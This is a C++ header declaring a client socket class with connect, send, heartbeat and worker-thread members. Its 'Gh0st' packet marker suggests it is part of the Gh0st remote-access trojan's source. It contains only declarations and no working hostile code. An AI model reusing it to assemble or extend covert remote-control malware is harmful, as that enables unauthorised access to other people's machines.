// ClientSocket.h: interface for the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
#define AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_

#include "ddc_thread.h"
#include "Buffer.h"	// Added by ClassView
#include "Manager.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// Change at your Own Peril

// 'G' 'h' '0' 's' 't' | PacketLen | UnZipLen
#define HDR_SIZE	18  //13
#define FLAG_SIZE	10//5

class CClientSocket  
{
	friend class CManager;
public:
	CBuffer m_CompressionBuffer;
	CBuffer m_DeCompressionBuffer;
	CBuffer m_WriteBuffer;
	CBuffer	m_ResendWriteBuffer;
	void Disconnect();
	BOOL Connect(LPCTSTR lpszHost, UINT nPort);
	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void SetManagerCallBack(CManager *pManager);
//	void setGlobalProxyOption(int nProxyType = PROXY_NONE, LPCTSTR	lpszProxyHost = NULL, UINT nProxyPort = 1080, LPCTSTR lpszUserName = NULL, LPCSTR lpszPassWord = NULL);
	DWORD run_event_loop(DWORD dwTime);
	BOOL IsRunning();
	BOOL bSendLogin;
	HANDLE m_hWorkerThread;
	SOCKET m_Socket;
	HANDLE m_hEvent;

	DWORD dwHeartTime;

	CClientSocket();
	virtual ~CClientSocket();
private:
//	static	int		m_nProxyType;
//	static	char	m_strProxyHost[256];
//	static	UINT	m_nProxyPort;
//	static	char	m_strUserName[256];
//	static	char	m_strPassWord[256];

	BYTE	m_bPacketFlag[FLAG_SIZE];
//	BOOL ConnectProxyServer(LPCTSTR lpszHost, UINT nPort);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	DWORD	GetProAddress( HMODULE phModule,char* pProcName );

	BOOL m_bIsRunning;
	CManager	*m_pManager;
	nm_ddc::CThreadMutex m_lock;

};

#endif // !defined(AFX_CLIENTSOCKET_H__1902379A_1EEB_4AFE_A531_5E129AF7AE95__INCLUDED_)
